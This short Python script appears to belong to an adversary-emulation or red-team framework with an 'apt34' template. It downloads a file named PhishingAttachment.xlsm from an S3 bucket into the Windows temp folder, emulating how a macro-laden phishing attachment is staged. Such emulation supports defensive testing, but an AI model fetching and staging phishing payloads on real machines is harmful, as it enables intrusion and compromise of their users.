from core.dependeny.windows.checker import *
from core.dependeny.windows.utils import *
from core.template import apt34

if __name__ == '__main__':
    # print(file_exist("$env:temp\wsu8257.tmp"))
    print(download("https://cym-rt-resources.s3-eu-west-1.amazonaws.com/PhishingAttachment.xlsm", "$env:temp\PhishingAttachment.xlsm")[1].decode('big5'))